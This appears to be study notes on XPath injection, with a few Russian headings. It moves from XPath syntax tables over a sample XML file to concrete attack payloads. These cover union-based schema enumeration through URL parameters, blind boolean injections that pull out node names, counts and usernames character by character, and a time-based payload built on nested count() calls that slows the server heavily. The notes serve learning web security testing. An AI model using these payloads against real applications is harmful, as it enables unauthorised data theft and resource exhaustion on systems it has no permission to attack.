# Example
```xml
<?xml version="1.0" encoding="UTF-8"?>
  
<academy_modules>  
  <module>
    <title>Web Attacks</title>
    <author>21y4d</author>
    <tier difficulty="medium">2</tier>
    <category>offensive</category>
  </module>

  <!-- this is a comment -->
  <module>
    <title>Attacking Enterprise Networks</title>
    <author co-author="LTNB0B">mrb3n</author>
    <tier difficulty="medium">2</tier>
    <category>offensive</category>
  </module>
</academy_modules>
```

|query|explaination|
|--------|--------|
|`module`|select all `module` child nodes of the context node|
|`/`|Select the document root node|
|`//`|Select descendant nodes of the context node|
|`.`|Select the context node|
|`..`|Select the parent node of the context node|
|`@difficulty`|Select the `difficulty` attribute node of the context node|
|`text()`|Select all text node child nodes of the context node|

## QUERIES
|query|explaination|
|--------|--------|
|`/academy_modules/module`|Select all `module` child nodes of `academy_modules` node|
|`//module`|Select all `module` nodes|
|`/academy_modules//title`|Select all `title` nodes that are descendants of the `academy_modules` node|
|`/academy_modules/module/tier/@difficulty`|Select the `difficulty` attribute node of all `tier` element nodes under the specified path|
|`//@difficulty`|Select all `difficulty` attribute nodes|

### Predicates
|query|explaination|
|--------|--------|
|`/academy_modules/module[1]`|Select the first `module` child node of the `academy_modules` node|
|`/academy_modules/module[position()=1]`|Select the first `module` child node of the `academy_modules` node|
|`/academy_modules/module[last()]`|Select the last `module` child node of the `academy_modules` node|
|`/academy_modules/module[position()<3]`|Select the first two `module` child nodes of the `academy_modules` node|
|`//module[tier=2]/title`|Select the `title` of all modules where the `tier` element node equals `2`|
|`//module/author[@co-author]/../title`|Select the `title` of all modules where the `author` element node has a `co-author` attribute node|
|`//module/tier[@difficulty="medium"]/..`|Select all modules where the `tier` element node has a `difficulty` attribute node set to `medium`|

## Wildcards & Union
|Query|Explaination|
|--------|--------|
|`node()`|Matches any node|
|`*`|Matches any `element` node|
|`@*`|Matches any `attribute` node|
|`//module[tier=2]/title/text() \| //module[tier=3]/title/text()`|	Select the title of all modules in tiers 2 and 3|

## Functions
- `name()` - name of the node
- `substring()` -  allows us to exfiltrate the name of a node one character at a time
- `string-length()` - enables us to determine the length of a node name to know when to stop the exfiltration
- `count()` - returns the number of children of an element node

## Useful commands
- `count((//.)[count((//.))])` равносильно `sleep`
- `string-length(name(/*[1]))=1`
- `substring(name(/*[1]),1,1)='a'`
- `count(/users/*)=1`

### Приложение возвращает не все данные
To iterate through the XML schema, we must first determine the schema depth. We can achieve this by ensuring the original XPath query returns no results and appending a new query that gives us information about the schema depth. We set the search term in the parameter `q` to anything that does not return data, for instance, `SOMETHINGINVALID`. We can then set the parameter `f` to `fullstreetname | /*[1]`. This results in the following XPath query:
`/a/b/c/[contains(d/text(), 'SOMETHINGINVALID')]/fullstreetname | /*[1]`

We can now determine the schema depth by iteratively appending an additional `/*[1]` to the subquery until the behavior of the web application changes. The results look like this (the q parameter remains the same as above for all requests):

|query|Response|
|--|--|
|`fullstreetname \| /*[1]`|Nothing|
|`fullstreetname \| /*[1]/*[1]`|Nothing|
|`fullstreetname \| /*[1]/*[1]/*[1]`|Nothing|
|`fullstreetname \| /*[1]/*[1]/*[1]/*[1]`|`01ST ST`|
|`fullstreetname \| /*[1]/*[1]/*[1]/*[1]/*[1]`|Nothing|

### Extracting information

To exract information about 2 node:
`fullstreetname | /*[1]/*[1]/*[2]/*[1]`


#### Blind
|query|result|Description|
|--|--|--|
|`invalid' or substring(name(/*[1]),1,1)='a' and '1'='1`|`/users/user[username='invalid' or substring(name(/*[1]),1,1)='a' and '1'='1']`|Count the length of the node|
|`invalid' or substring(name(/*[1]),2,1)='a' and '1'='1`||Get name of the node|
|`invalid' or count(/users/*)=1 and '1'='1`|`/users/user[username='invalid' or count(/users/*)=1 and '1'='1']`|Exfiltrating the Number of Child Nodes|
|`invalid' or string-length(/users/user[1]/username)=1 and '1'='1`|`/users/user[username='invalid' or string-length(/users/user[1]/username)=1 and '1'='1']`|Exfiltrating Data(length)|
|`invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1`|`/users/user[username='invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1']`|Exfiltrating Data (content)|

##### Time-based Exploitation
`invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1`

If the condition `substring(/users/user[1]/username,1,1)='a'` is `true`, the second part of the `and` clause needs to be evaluated, such that the web application evaluates `count((//.)[count((//.))])` causing it to exponentially iterate over the entire XML document resulting in significant processing time. On the other hand, if the initial condition is `false`, the second part of the `and` clause does not need to be evaluated since the predicate will return `false` no matter what the second part evaluates. Therefore, the web application does not evaluate it. This difference in processing time enables us to determine whether our injected condition is true.